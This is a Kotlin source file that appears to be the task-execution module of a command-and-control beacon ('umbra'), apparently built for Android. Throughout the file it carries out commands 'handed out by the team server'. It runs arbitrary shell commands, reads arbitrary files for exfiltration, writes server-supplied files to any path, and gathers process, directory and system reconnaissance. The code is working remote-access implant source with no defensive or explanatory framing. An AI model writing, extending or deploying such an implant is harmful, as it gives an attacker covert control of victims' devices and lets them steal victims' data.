package io.umbra.beacon

import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit

/** Executes tasks handed out by the team server. */
object TaskRunner {
    const val MAX_OUTPUT = 900 * 1024

    class Outcome(val code: Long, val out: ByteArray, val err: String) {
        fun toValue(taskId: String): Upk.MapV = Upk.map(
            "id" to Upk.str(taskId),
            "code" to Upk.num(code),
            "out" to Upk.bin(out),
            "err" to Upk.str(err),
        )
    }

    fun shell(command: String, timeoutSec: Long): Outcome {
        if (command.isBlank()) return Outcome(1, ByteArray(0), "empty command")
        val limit = timeoutSec.coerceAtLeast(1)
        return try {
            // stderr is merged into stdout so one thread drains both.
            val proc = ProcessBuilder("sh", "-c", command)
                .redirectErrorStream(true)
                .start()
            // The child never reads stdin; closing it makes `cat`-style
            // commands see EOF instead of hanging until the timeout.
            runCatching { proc.outputStream.close() }

            // Drain concurrently. Reading only after waitFor would deadlock on
            // any command that writes more than the pipe buffer (~64 KiB):
            // the child blocks in write() and never exits. The buffer is
            // capped, but reading continues so the child can always finish.
            val sink = ByteArrayOutputStream()
            val reader = Thread {
                val chunk = ByteArray(8192)
                try {
                    proc.inputStream.use { input ->
                        while (true) {
                            val n = input.read(chunk)
                            if (n < 0) break
                            synchronized(sink) {
                                val room = MAX_OUTPUT + 4096 - sink.size()
                                if (room > 0) sink.write(chunk, 0, minOf(n, room))
                            }
                        }
                    }
                } catch (_: IOException) {
                    // Stream closed by destroyForcibly() or a broken pipe.
                }
            }
            reader.isDaemon = true
            reader.start()

            val finished = proc.waitFor(limit, TimeUnit.SECONDS)
            if (!finished) {
                proc.destroyForcibly()
                reader.join(1000)
                return Outcome(124, drained(sink), "timeout after ${limit}s")
            }
            reader.join(2000)
            if (reader.isAlive) {
                return Outcome(proc.exitValue().toLong(), drained(sink), "output reader stalled")
            }
            Outcome(proc.exitValue().toLong(), drained(sink), "")
        } catch (t: Throwable) {
            Outcome(127, ByteArray(0), "exec failed: ${t.message}")
        }
    }

    /** Snapshot the drained output, truncating with a marker past MAX_OUTPUT. */
    private fun drained(sink: ByteArrayOutputStream): ByteArray {
        val all = synchronized(sink) { sink.toByteArray() }
        if (all.size <= MAX_OUTPUT) return all
        return all.copyOfRange(0, MAX_OUTPUT) + "\n[umbra: output truncated]\n".toByteArray()
    }

    fun run(kind: String, args: Upk): Outcome {
        val path = args.field("path")?.text() ?: ""
        return when (kind) {
            "shell", "exec" -> shell(
                args.field("cmd")?.text() ?: "",
                args.field("timeout")?.long() ?: 60,
            )
            "sysinfo", "recon" -> Outcome(0, SysInfo.report().toByteArray(), "")
            "ls" -> listDir(if (path.isEmpty()) "/" else path)
            "download", "cat" -> {
                if (path.isEmpty()) Outcome(1, ByteArray(0), "download requires path")
                else try {
                    val data = File(path).readBytes()
                    Outcome(0, if (data.size > MAX_OUTPUT) data.copyOfRange(0, MAX_OUTPUT) else data, "")
                } catch (t: Throwable) {
                    Outcome(1, ByteArray(0), "download: ${t.message}")
                }
            }
            "upload" -> {
                val data = args.field("data")?.bytes() ?: ByteArray(0)
                if (path.isEmpty()) Outcome(1, ByteArray(0), "upload requires path")
                else try {
                    File(path).writeBytes(data)
                    Outcome(0, "wrote ${data.size} bytes to $path\n".toByteArray(), "")
                } catch (t: Throwable) {
                    Outcome(1, ByteArray(0), "upload: ${t.message}")
                }
            }
            "ps" -> processList()
            "sleep" -> Outcome(0, "sleep interval updated\n".toByteArray(), "")
            "exit", "kill" -> Outcome(0, "beacon exiting\n".toByteArray(), "")
            "ping" -> Outcome(0, "pong\n".toByteArray(), "")
            else -> Outcome(2, ByteArray(0), "unknown task kind \"$kind\"")
        }
    }

    /**
     * Best-effort process list. Android restricts /proc to the app's own uid on
     * modern releases, so this degrades to whatever is visible and says so.
     */
    private fun processList(): Outcome = try {
        val proc = File("/proc")
        val pids = proc.listFiles { f -> f.name.all { it.isDigit() } } ?: return Outcome(1, ByteArray(0), "ps: /proc not readable")
        val sb = StringBuilder()
        var visible = 0
        pids.mapNotNull { it.name.toIntOrNull() }.sorted().forEach { pid ->
            val cmdline = try {
                File("/proc/$pid/cmdline").readBytes().toString(Charsets.UTF_8).replace('\u0000', ' ').trim()
            } catch (_: Throwable) {
                ""
            }
            if (cmdline.isNotEmpty()) {
                visible += 1
                sb.append("%d %s%n".format(pid, cmdline))
            }
        }
        if (visible == 0) sb.append("ps: process list restricted by the platform\n")
        Outcome(0, sb.toString().toByteArray(), "")
    } catch (t: Throwable) {
        Outcome(1, ByteArray(0), "ps: ${t.message}")
    }

    private fun listDir(path: String): Outcome = try {
        val dir = File(path)
        val entries = dir.listFiles() ?: return Outcome(1, ByteArray(0), "not a directory: $path")
        val sb = StringBuilder()
        entries.sortedBy { it.name }.forEach { f ->
            val kind = if (f.isDirectory) "d" else "-"
            sb.append("%s %12d %s%n".format(kind, f.length(), f.absolutePath))
        }
        Outcome(0, sb.toString().toByteArray(), "")
    } catch (t: Throwable) {
        Outcome(1, ByteArray(0), "ls: ${t.message}")
    }
}
